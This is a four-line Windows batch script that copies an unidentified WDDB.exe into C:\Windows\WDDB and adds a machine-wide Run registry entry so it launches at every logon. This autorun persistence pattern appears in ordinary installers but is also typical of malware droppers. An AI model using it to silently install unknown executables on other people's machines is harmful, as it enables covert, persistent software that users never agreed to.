@echo off
md "C:\Windows\WDDB"
copy .\WDDB.exe C:\Windows\WDDB\WDDB.exe
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WDDB /t REG_SZ /d "C:\Windows\WDDB\WDDB.exe"